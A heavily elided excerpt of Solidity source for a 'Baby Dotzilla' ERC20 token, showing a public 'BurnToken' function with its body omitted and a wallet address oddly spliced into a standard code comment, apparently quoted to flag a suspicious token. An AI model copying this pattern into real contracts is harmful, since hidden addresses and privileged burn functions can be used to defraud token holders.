...
contract ERC20 is Context, IERC20, Ownable {
   ...
   function BurnToken(uint256 amount) public returns (bool) {
     ...
     * applications that 0x215dba9a96f21a40c0b0aad41ed2f4cb6b8d6253interact with token contracts will not expect
...
contract BabyDotzilla   is ERC20 {

    uint tokenTotalSupply = 100000000;

    constructor() public ERC20("Baby Dotzilla", "Baby Dotzilla") {
